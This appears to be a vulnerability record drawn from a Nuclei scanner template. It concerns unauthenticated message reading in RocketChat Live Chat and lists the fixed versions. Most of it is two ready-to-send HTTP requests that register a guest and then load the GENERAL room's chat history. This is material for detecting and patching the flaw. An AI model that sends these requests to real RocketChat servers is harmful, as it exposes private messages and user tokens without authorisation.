# Vulnerability: RocketChat Live Chat - Unauthenticated Read Access
**Classification:** CWE-522
**Source:** Nuclei Template (`unauth-message-read.yaml`)

## Description
RocketChat Live Chat accepts invalid parameters that could potentially allow unauthenticated access to messages and user tokens.

## Secure Mitigation
Fixed in versions 3.11, 3.10.5, 3.9.7, and 3.8.8.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

{"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"{{value}}\",\"name\":\"cve-2020-{{value}}\",\"email\":\"{{user_email}}\"}],\"id\":\"123\"}"}

POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json

{"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"{{value}}\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}
```

